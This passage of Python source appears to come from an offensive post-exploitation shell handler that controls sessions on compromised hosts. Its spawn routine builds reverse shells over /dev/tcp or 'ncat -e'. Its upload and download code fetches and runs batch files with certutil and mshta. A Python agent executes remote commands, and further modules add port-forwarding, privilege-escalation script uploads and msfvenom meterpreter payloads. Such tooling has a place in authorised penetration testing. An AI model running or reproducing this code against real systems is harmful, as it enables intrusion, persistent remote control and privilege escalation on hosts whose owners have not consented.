				'Write-Host $b64"'
			)
			with open(tempfile_bat, "w") as f:
				f.write(cmd)

			server = FileServer(host=self._host, password=rand(8), quiet=True)
			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			data = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
				value=True, timeout=None)
			server.stop()

			downloaded = set()
			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
						newpath = Path(zipdata.extract(item, path=local_download_folder))

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii.Error:
				logger.error("The item does not exist or access is denied")

		for item in downloaded:
			logger.info(f"{paint('Downloaded').GREEN_white} => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO

		return downloaded

	def upload(self, local_items, remote_path=None, randomize_fname=False):

		# Check remote permissions
		destination = remote_path or self.cwd
		try:
			if self.OS == 'Unix':
				if self.agent:
					if not eval(self.exec(f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()", python=True, value=True)):
						logger.error(f"{destination}: Permission denied")
						return []
				else:
					if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
						logger.error(f"{destination}: Permission denied")
						return []
			elif self.OS == 'Windows':
				pass # TODO
		except Exception as e:
			logger.error(e)

		# Initialization
		try:
			local_items = shlex.split(local_items)
		except ValueError as e:
			logger.error(e)
			return []

		# Check for necessary binaries
		if self.OS == 'Unix' and not self.agent:
			dependencies = ['echo', 'base64', 'tar', 'rm']
			for binary in dependencies:
				if not self.bin[binary]:
					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
					return []

		# Resolve items
		resolved_items = []
		for item in local_items:
			# Download URL
			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
				try:
					filename, item = url_to_bytes(item)
					resolved_items.append((filename, item))
				except Exception as e:
					logger.error(e)

			elif item.startswith(os.path.sep):
				items = list(Path(os.path.sep).glob(item.lstrip(os.path.sep)))
				if items:
					resolved_items.extend(items)
				else:
					logger.error(f"No such file or directory: {item}")
			else:
				items = list(Path().glob(item))
				if items:
					resolved_items.extend(items)
				else:
					logger.error(f"No such file or directory: {item}")
		if not resolved_items:
			return []

		#item = os.path.expanduser(item) # TOCHECK

		if self.OS == 'Unix':
			# Get remote available space
			if self.agent:
				response = self.exec(f"""
				stats = os.statvfs('{destination}')
				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
				""", python=True, value=True, preserve_dir=True)

				remote_available_blocks, remote_block_size = map(int, response.split(';'))
				remote_space = remote_available_blocks * remote_block_size
			else:
				remote_block_size = int(self.exec(rf"stat {destination}| sed -n 's/.*IO Block: \([0-9]*\).*/\1/p'", value=True))
				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

			# Calculate local size
			local_size = 0
			for item in resolved_items:
				if isinstance(item, tuple):
					local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
				else:
					local_size += get_glob_size(str(item), remote_block_size)

			# Check required space
			need = local_size - remote_space
			if need > 0:
				logger.error(
					f"--- Not enough space on target... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Start Uploading
			if self.agent:
				stdin_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdin_stream, stderr_stream]):
					return

				code = r"""
				import tarfile
				tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
				tar.extract = handle_exceptions(tar.extract, stderr_stream.id)
				tar.errorlevel = 1
				for item in tar:
					tar.extract(item)
				tar.close()
				stdin_stream.terminate()
				"""
				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stderr_stream': stderr_stream,
					'preserve_dir': True
				}).start()

				tar_destination, mode = stdin_stream, "r|gz"
			else:
				tar_buffer = io.BytesIO()
				tar_destination, mode = tar_buffer, "r:gz"

			tar = tarfile.open(mode='w|gz', fileobj=tar_destination, format=tarfile.GNU_FORMAT)
			tar.add = handle_exceptions(tar.add)

			altnames = []
			for item in resolved_items:
				if isinstance(item, tuple):
					filename, data = item

					if randomize_fname:
						filename = Path(filename)
						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
					else:
						altname = filename

					file = tarfile.TarInfo(name=altname)
					file.size = len(data)
					file.mode = 0o770
					file.mtime = int(time.time())

					tar.addfile(file, io.BytesIO(data))
				else:
					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
					tar.add(item, arcname=altname)

				altnames.append(altname)

			tar.close()

			if self.agent:
				stdin_stream.write(b"") # TO CHECK
				stdin_stream.terminate()

				error_buffer = ''
				while True:
					r, _, _ = select.select([stderr_stream], [], [])
					data = stderr_stream.read(NET_BUF_SIZE)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(line)
					else:
						break
			else: # TODO
				tar_buffer.seek(0)
				data = base64.b64encode(tar_buffer.read()).decode()
				temp = self.tmp + "/" + rand(8)

				for chunk in chunks(data, options.upload_chunk_size):
					response = self.exec(f"echo -n {chunk} >> {temp}")
					if response is False:
						#progress_bar.terminate()
						logger.error("Upload interrupted")
						return [] # TODO
					#progress_bar.update(len(chunk))

				#logger.info(paint("--- Remote unpacking...").blue)
				dest = f"-C {remote_path}" if remote_path else ""
				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
				response = self.exec(cmd, value=True, preserve_dir=True)
				exit_code = int(self.exec("echo $temp", value=True))
				self.exec(f"rm {temp}")
				if exit_code:
					logger.error(response)
					return [] # TODO

		elif self.OS == 'Windows':
			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
				altnames = []
				for item in resolved_items:
					if isinstance(item, tuple):
						filename, data = item
						if randomize_fname:
							filename = Path(filename)
							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
						else:
							altname = filename
						zip_info = zipfile.ZipInfo(filename=str(altname))
						zip_info.date_time = time.localtime(time.time())[:6]
						myzip.writestr(zip_info, data)
					else:
						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
						myzip.write(item, arcname=altname)
					altnames.append(altname)

			server = FileServer(host=self._host, password=rand(8), quiet=True)
			urlpath_zip = server.add(tempfile_zip)

			cwd_escaped = self.cwd.replace('\\', '\\\\')
			tmp_escaped = self.exec("echo %TEMP%", value=True).replace('\\', '\\\\')
			temp_remote_file_zip = urlpath_zip.split("/")[-1]

			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'

			with open(tempfile_bat, "w") as f:
				f.write(fetch_cmd + "\n")
				f.write(unzip_cmd)

			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			response = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
				value=True, timeout=None)
			server.stop()
			if not "DOWNLOAD OK" in response:
				logger.error("Data transfer failed...")
				return []
			if not "UNZIP OK" in response:
				logger.error("Data unpacking failed...")
				return []

		# Present uploads
		altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))

		for item in altnames:
			uploaded_path = shlex.quote(str(item)) if self.OS == 'Unix' else f'"{item}"'
			logger.info(f"{paint('Uploaded').GREEN_white} => {paint(uploaded_path).yellow}")
		return altnames

	def script(self, local_script):
		if not self.agent:
			logger.error("This can only be run in python agent mode: Try to 'upgrade' the session first")
			return False

		local_script_folder = self.directory / "scripts"
		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

		try:
			local_script_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return False

		if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
			try:
				filename, data = url_to_bytes(local_script)
			except Exception as e:
				logger.error(e)

			local_script = local_script_folder / (prefix + filename)
			with open(local_script, "wb") as input_file:
				input_file.write(data)
		else:
			local_script = Path(local_script)

		output_file_name = local_script_folder / (prefix + "output.txt")

		try:
			with open(local_script, "rb") as input_file, open(output_file_name, "wb") as output_file:

				first_line = input_file.readline().strip()
				input_file.seek(0) # Maybe it is not needed
				if first_line.startswith(b'#!'):
					program = first_line[2:].decode()
				else:
					logger.error("No shebang found")
					return False

				tail_cmd = f'\ntail -n+0 -f {output_file_name}'
				Open(tail_cmd, terminal=True)
				print(tail_cmd)

				self.exec(program, stdin_src=input_file, stdout_dst=output_file, stderr_dst=output_file, preserve_dir=True)
		except Exception as e:
			logger.error(e)
			return False

		return True

	def spawn(self, port=None, host=None):
		#print(threading.current_thread().name)
		if self.OS == "Unix":
			if any([self.listener, port, host]):
				if port is None: port = self._port
				if host is None: host = self._host

				new_listener = Listener(host, port)

				if self.bin['bash']:
					# bash -i doesn't always work
					# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
					# temp fix, appending 2>&1 because of popen in agent
					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'

				elif self.bin['sh']:
					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
					ncat_binary = self.tmp + '/ncat'
					if not self.exec(f"test -f {ncat_binary} || echo x"):
						cmd = ncat_cmd.format(ncat_binary)
					else:
						logger.warning("ncat is not available on the target")
						ncat_binary = self.need_binary(
							"ncat",
							BINARIES['ncat']
							)
						if ncat_binary:
							cmd = ncat_cmd.format(ncat_binary)
						else:
							logger.error("Spawning shell aborted")
							return False
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")

		return True

	def portfwd(self, _type, lhost, lport, rhost, rport):

		#print(_type, lhost, lport, rhost, rport)
		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
			def handle(self):

				#self.request.setblocking(False)

				stdin_stream = core.sessions[1].new_streamID # TEMP
				stdout_stream = core.sessions[1].new_streamID
				stderr_stream = core.sessions[1].new_streamID

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					return

				code = rf"""
				import socket
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				frlist = [stdin_stream]
				connected = False
				while True:
					readables, _, _ = select.select(frlist, [], [])

					for readable in readables:
						if readable is stdin_stream:
							data = stdin_stream.read(NET_BUF_SIZE)
							if not connected:
								client.connect(("{rhost}", {rport}))
								frlist.append(client)
								connected = True
								#client.setblocking(False)
							try:
								client.sendall(data)
							except OSError:
								break
							if not data:
								frlist.remove(stdin_stream)

						if readable is client:
							try:
								data = client.recv(NET_BUF_SIZE)
								stdout_stream.write(data)
								if not data:
									frlist.remove(client) # TEMP
									break
							except OSError:
								frlist.remove(client) # TEMP
								break

					else:
						continue
					break
				client.close()
				"""

				core.sessions[1].exec(
					code,
					python=True,
					stdin_stream=stdin_stream,
					stdout_stream=stdout_stream,
					stderr_stream=stderr_stream,
					stdin_src=self.request,
					stdout_dst=self.request
				)

				"""threading.Thread(target=core.sessions[1].exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()



				rlist = [self.request, stdout_stream]
				while True:
					readables, _, _ = select.select(rlist, [], [])

					for readable in readables:
						if readable is stdout_stream:
							data = stdout_stream.read(NET_BUF_SIZE)
							try:
								self.request.sendall(data)
							except OSError:
								break
							if not data:
								rlist.remove(stdout_stream)

						if readable is self.request:
							try:
								data = self.request.recv(NET_BUF_SIZE)
							except OSError:
								break
							stdin_stream.write(data)
							if not data:
								break

					else:
						continue
					break

				#stderr_stream.terminate() # TEMP"""
				#print("FWD Socket terminated")

		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
			allow_reuse_address = True
			request_queue_size = 100

		def server_thread():
			with ThreadedTCPServer((lhost, lport), ThreadedTCPRequestHandler) as server:
				server.serve_forever()

		threading.Thread(target=server_thread).start()


	def maintain(self):
		with core.lock:
			current_num = len(core.hosts[self.name])
			if 0 < current_num < options.maintain:
				session = core.hosts[self.name][-1]
				logger.warning(paint(
						f" --- Session {session.id} is trying to maintain {options.maintain} "
						f"active shells on {self.name} ---"
					).blue)
				session.spawn()
				return True
		return False

	def kill(self):

		if self not in core.rlist:
			return True

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.need_control_sessions and\
				not self.spare_control_sessions and\
				self.control_session is self:
				sessions = ', '.join([str(session.id) for session in self.need_control_sessions])
				if thread_name == 'Menu':
					logger.warning(
						f"Cannot kill Session {self.id} as the following sessions depend on it: {sessions}"
					)
					return False
				else:
					logger.error(f"Sessions {sessions} need a control session.")

			for module in Module.modules.values():
				module.session = self
				module.session_end()

			core.control << f'self.sessions[{self.id}].kill()'
			if thread_name == 'Menu':
				menu.kill_wait = queue.Queue()
				logger.error(menu.kill_wait.get())
				del menu.kill_wait

			self.maintain()
			return

		if self.subchannel.active:
			self.subchannel.control << 'kill'

		core.rlist.remove(self)
		del core.sessions[self.id]

		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {paint(self.name).white_RED} 🙄\r"
		else:
			message = f"Session [{self.id}] died..."

			if not core.hosts[self.name]:
				message += f" We lost {paint(self.name).white_RED} 💔"

		if hasattr(menu, 'kill_wait'):
			menu.kill_wait.put(message)
		else:
			logger.error(message)

		if hasattr(menu, 'sid') and hasattr(self, 'id') and menu.sid == self.id:
			menu.set_id(None)

		if hasattr(self, 'logfile'):
			self.logfile.close()

		if self.is_attached:
			self.detach()

		# Kill tasks

		return True


class Module:
	modules = dict()
	def __init__(self):
		self.name = self.__class__.__name__
		Module.modules[self.name] = self

	def run(self):
		pass

	def session_start(self):
		pass

	def session_end(self):
		pass

	def post_upgrade(self):
		pass

class upload_privesc_scripts(Module):
	description = 'Upload privilege escalation scripts to the target'
	def run(self):
		if self.session.OS == 'Unix':
			self.session.upload(BINARIES['linpeas'])
			self.session.upload(BINARIES['lse'])
		elif self.session.OS == 'Windows':
			self.session.upload(BINARIES['winpeas'])
			self.session.upload(BINARIES['powerup'])

class peass_ng(Module):
	description = 'Run the latest version of PEASS-ng in the background'
	def run(self):
		if self.session.OS == 'Unix':
			self.session.script(BINARIES['linpeas'])
		elif self.session.OS == 'Windows':
			logger.error("This module runs only in Unix shells")

class lse(Module):
	description = 'Run the latest version of linux-smart-enumeration in the background'
	def run(self):
		if self.session.OS == 'Unix':
			self.session.script(BINARIES['lse'])
		else:
			logger.error("This module runs only in Unix shells")

class meterpreter(Module):
	description = 'Get a meterpreter shell'
	def run(self):
		if self.session.OS == 'Unix':
			logger.error("This module runs only in Windows shells")
		else:
			payload_path = f"/dev/shm/{rand(10)}.exe"
			host = self.session._host
			port = 5555
			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)

			if result.returncode == 0:
				logger.info("Payload created!")
				uploaded_path = self.session.upload(payload_path)
				if uploaded_path:
					meterpreter_handler_cmd = f'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {host}; set LPORT {port}; run"'
					Open(meterpreter_handler_cmd, terminal=True)
					print(meterpreter_handler_cmd)
					self.session.exec(uploaded_path[0])
			else:
				logger.error(f"Cannot create meterpreter payload: {result.stderr}")


for subclass in Module.__subclasses__():
	subclass()


class Messenger:
	SHELL = 1
	RESIZE = 2
	EXEC = 3
	STREAM = 4

	STREAM_CODE = '!B'
	STREAM_BYTES = struct.calcsize(STREAM_CODE)

	LEN_CODE = 'H'
	_LEN_CODE = '!' + 'H'
	LEN_BYTES = struct.calcsize(LEN_CODE)

	TYPE_CODE = 'B'
	_TYPE_CODE = '!' + 'B'
	TYPE_BYTES = struct.calcsize(TYPE_CODE)

	HEADER_CODE = '!' + LEN_CODE + TYPE_CODE

	def __init__(self, bufferclass):
		self.len = None
		self.input_buffer = bufferclass()
		self.length_buffer = bufferclass()
		self.message_buffer = bufferclass()

	def message(_type, _data):
		return struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type) + _data
	message = staticmethod(message)

	def feed(self, data):
		self.input_buffer.write(data)
		self.input_buffer.seek(0)

		while True:
			if not self.len:
				len_need = Messenger.LEN_BYTES - self.length_buffer.tell()
				data = self.input_buffer.read(len_need)
				self.length_buffer.write(data)
				if len(data) != len_need:
					break

				self.len = struct.unpack(Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
				self.length_buffer.seek(0)
				self.length_buffer.truncate()
			else:
				data_need = self.len - self.message_buffer.tell()
				data = self.input_buffer.read(data_need)
				self.message_buffer.write(data)
				if len(data) != data_need:
					break

				self.message_buffer.seek(0)
				_type = struct.unpack(Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
				_message = self.message_buffer.read()

				self.len = None
				self.message_buffer.seek(0)
				self.message_buffer.truncate()
				yield _type, _message

		self.input_buffer.seek(0)
		self.input_buffer.truncate()


class Stream:
	def __init__(self, _id, _session=None):
		self.id = _id
		self._read, self._write = os.pipe()
		self.writebuf = None
		self.feed_thread = None
		self.session = _session

		if self.session:
			self.lock = self.session.stream_lock
			self.pool = self.session.streams
			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))
		else:
			self.lock = None
			self.pool = streams
			self.writefunc = lambda data: respond(self.id + data)
			flags = fcntl.fcntl(self._write, fcntl.F_GETFD) # TEMP FIX
			fcntl.fcntl(self._write, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)

	def __lshift__(self, data):
		if not self.writebuf:
			self.writebuf = queue.Queue()
		self.writebuf.put(data)
		if not self.feed_thread:
			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
			self.feed_thread.start()

	def feed(self):
		while True:
			data = self.writebuf.get()
			if not data:
				os.close(self._write)
				break
			try:
				os.write(self._write, data)
			except:
				pass

	def fileno(self):
		return self._read

	def write(self, data):
		self.writefunc(data)

	def read(self, n):
		data = os.read(self._read, n)
		if not data:
			os.close(self._read)
		return data

	def terminate(self):
		try:
			if self.lock:
				self.lock.acquire()
			if self.id in self.pool:
				del self.pool[self.id]
			if self.lock:
				self.lock.release()
		except (OSError, KeyError):
			pass


def agent():
	import os
	import sys
	import pty
	import shlex
	import fcntl
	import select
	import struct
	import signal
	import termios
	import threading

	if sys.version_info[0] == 2:
		import Queue as queue
	else:
		import queue
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	SHELL = "{}"
	NET_BUF_SIZE = {}
	{}
	{}

	def respond(_value, _type=Messenger.STREAM):
		wlock.acquire()
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)
			os.write(control_in, "1".encode())
		wlock.release()

	def handle_exceptions(func, streamID):
		def inner(*args, **kwargs):
			try:
				func(*args, **kwargs)
			except:
				_, e, _ = sys.exc_info()
				respond(streamID + (str(e) + '\n').encode())
		return inner

	shell_pid, master_fd = pty.fork()
	if shell_pid == pty.CHILD:
		os.execl(SHELL, SHELL, '-i') # TEMP # TODO
	try:
		pty.setraw(pty.STDIN_FILENO)
	except:
		pass

	try:
		tasks = dict()
		pipes = dict()
		streams = dict()

		messenger = Messenger(bufferclass)
		outbuf = bufferclass()
		ttybuf = bufferclass()

		wlock = threading.Lock()
		control_out, control_in = os.pipe()
		#flags = fcntl.fcntl(control_out, fcntl.F_GETFD)
		#inheritance = bool(flags & fcntl.FD_CLOEXEC) # TODO
		rlist = [control_out, master_fd, pty.STDIN_FILENO]
		wlist = []
		#for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO): # TODO
		#	flags = fcntl.fcntl(fd, fcntl.F_GETFL)
		#	fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

		while True:
			rfds, wfds, xfds = select.select(rlist, wlist, [])

			for readable in rfds:
				if readable is control_out:
					os.read(control_out, 1)

				elif readable is master_fd:
					data = os.read(master_fd, NET_BUF_SIZE)
					respond(data, Messenger.SHELL) # TOCHECK
					if not data:
						rlist.remove(master_fd)
						os.close(master_fd)

				elif readable is pty.STDIN_FILENO:
					data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					if not data:
						raise OSError

					messages = messenger.feed(data)
					for _type, _value in messages:
						#open("/tmp/" + "debug", "a").write(repr((_type, _value)) + "\n")
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.EXEC:
							_type, stdin_stream_id, stdout_stream_id, stderr_stream_id, cmd = \
							_value[:1], \
							_value[1:Messenger.STREAM_BYTES + 1], \
							_value[Messenger.STREAM_BYTES + 1:Messenger.STREAM_BYTES * 2 + 1], \
							_value[Messenger.STREAM_BYTES * 2 + 1:Messenger.STREAM_BYTES * 3 + 1], \
							_value[Messenger.STREAM_BYTES * 3 + 1:]

							stdin_stream = Stream(stdin_stream_id)
							stdout_stream = Stream(stdout_stream_id)
							stderr_stream = Stream(stderr_stream_id)

							streams[stdin_stream_id] = stdin_stream
							streams[stdout_stream_id] = stdout_stream
							streams[stderr_stream_id] = stderr_stream

							rlist.append(stdout_stream)
							rlist.append(stderr_stream)

							if _type == 'S'.encode():
								pid = os.fork()
								if pid == 0:
									#import resource
									#for fd in range(resource.getrlimit(resource.RLIMIT_NOFILE)[0]):
									#	if not fd in (stdin_stream._read, stdout_stream._write, stderr_stream._write):
									#		try:
									#			os.close(fd)
									#		except:
									#			pass
									os.dup2(stdin_stream._read, 0)
									os.dup2(stdout_stream._write, 1)
									os.dup2(stderr_stream._write, 2)

									os.execl("/bin/sh", "sh", "-c", cmd)
									os._exit(1)

								os.close(stdin_stream._read)
								os.close(stdout_stream._write)
								os.close(stderr_stream._write)

							elif _type == 'P'.encode():
								def run(stdin_stream, stdout_stream, stderr_stream):
									try:
										{}
									except:
										_, e, _ = sys.exc_info()
										stderr_stream << str(e).encode()

									stdout_stream << ""
									stderr_stream << ""

								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

						# Incoming streams
						elif _type == Messenger.STREAM:
							try:
								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
								streams[stream_id] << data
								if not data:
									streams[stream_id].terminate()
							except KeyError:
								pass

				# Outgoing streams
				else:
					data = os.read(readable.fileno(), NET_BUF_SIZE)
					readable.write(data)
					if not data:
						rlist.remove(readable)
						readable.terminate()

			for writable in wfds:

				if writable is pty.STDOUT_FILENO:
					sendbuf = outbuf
					wlock.acquire()

				elif writable is master_fd:
					sendbuf = ttybuf

				try:
					sent = os.write(writable, sendbuf.getvalue())
				except OSError:
					if sendbuf is outbuf:
						wlock.release()
					break

				sendbuf.seek(sent)
				remaining = sendbuf.read()
				sendbuf.seek(0)
				sendbuf.truncate()
				sendbuf.write(remaining)
				if not remaining:
					wlist.remove(writable)
				if sendbuf is outbuf:
					wlock.release()

	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()

	os.close(master_fd)
	os.waitpid(shell_pid, 0)[1]

	os.kill(os.getppid(), signal.SIGKILL) # TODO


class FileServer:
	def __init__(self, *items, port=None, host=None, password=None, quiet=False):
		self.port = port or 8000
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.items = items
		self.password = password + '/' if password else ''
		self.quiet = quiet
		self.filemap = {}
		for item in self.items:
			self.add(item)

	def add(self, item):
		if item == '/':
			self.filemap[f'/{self.password}[root]'] = '/'
			return '/[root]'

		item = os.path.abspath(item)

		if not os.path.exists(item):
			if not self.quiet:
				logger.warning(f"'{item}' does not exist and will be ignored.")
			return None

		if item in self.filemap.values():
			for _urlpath, _item in self.filemap.items():
				if _item == item:
					return _urlpath

		urlpath = f"/{self.password}{os.path.basename(os.path.normpath(item))}"
		while urlpath in self.filemap:
			root, ext = os.path.splitext(urlpath)
			urlpath = root + '_' + ext
		self.filemap[urlpath] = item
		return urlpath

	def remove(self, item):
		if item in self.filemap:
			del self.filemap[f"/{os.path.basename(os.path.normpath(item))}"]
		else:
			if not self.quiet:
				logger.warning(f"{item} is not served.")

	@property
	def hints(self):
		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.password))
			table = Table(joinchar=' → ')
			for urlpath, filepath in self.filemap.items():
				table += (paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green + paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath)
			output.append(str(table))
			output.append("-" * len(output[1]))

		return f'\r\n'.join(output)

	def start(self):
		threading.Thread(target=self._start).start()

	@handle_bind_errors
	def _start(self):
		filemap, host, port, password, quiet = self.filemap, self.host, self.port, self.password, self.quiet

		class CustomTCPServer(socketserver.TCPServer):
			allow_reuse_address = True

			def __init__(self, *args, **kwargs):
				self.client_sockets = []
				super().__init__(*args, **kwargs)

			@handle_bind_errors
			def server_bind(self):
				self.server_address = (host, int(port))
				super().server_bind()

			def process_request(self, request, client_address):
				self.client_sockets.append(request)
				super().process_request(request, client_address)

			def shutdown(self):
				for sock in self.client_sockets:
					try:
						sock.shutdown(socket.SHUT_RDWR)
						sock.close()
					except:
						pass
				super().shutdown()

		class CustomHandler(http.server.SimpleHTTPRequestHandler):
			def do_GET(self):
				try:
					if self.path == '/' + password:
						response = ''
						for path in filemap.keys():
							response += f'<li><a href="{path}">{path}</a></li>'
						response = response.encode()
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.send_header("Content-Length", str(len(response)))
						self.end_headers()

						self.wfile.write(response)
					else:
						super().do_GET()
				except Exception as e:
					logger.error(e)

			def translate_path(self, path):
				path = path.split('?', 1)[0]
				path = path.split('#', 1)[0]
				try:
					path = unquote(path, errors='surrogatepass')
				except UnicodeDecodeError:
					path = unquote(path)
				path = os.path.normpath(path)

				for urlpath, filepath in filemap.items():
					if path == urlpath:
						return filepath
					elif path.startswith(urlpath):
						relpath = path[len(urlpath):].lstrip('/')
						return os.path.join(filepath, relpath)
				return ""

			def log_message(self, format, *args):
				if quiet:
					return None
				message = format % args
				response = message.translate(self._control_char_table).split(' ')
				if not response[0].startswith('"'):
					return
				if response[3][0] == '3':
					color = 'yellow'
				elif response[3][0] in ('4', '5'):
					color = 'red'
				else:
					color = 'green'

				response = getattr(paint(f"{response[0]} {response[1]} {response[3]}\""), color)

				logger.info(f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}")

		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
			result = self.httpd.server_bind()
			if isinstance(result, str):
				logger.error(result)
				return False
			self.httpd.server_activate()
			self.id = core.new_fileserverID
			core.fileservers[self.id] = self
			if not quiet:
				print(self.hints)
			self.httpd.serve_forever()

	def stop(self):
		del core.fileservers[self.id]
		if not self.quiet:
			logger.warning(f"Shutting down Fileserver #{self.id}")
		self.httpd.shutdown()

################################## GENERAL PURPOSE CUSTOM CODE ####################################

caller = lambda: inspect.stack()[2].function
rand = lambda _len: ''.join(random.choice(string.ascii_letters) for i in range(_len))
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda filepath: (
	f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
	f'{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07'
)

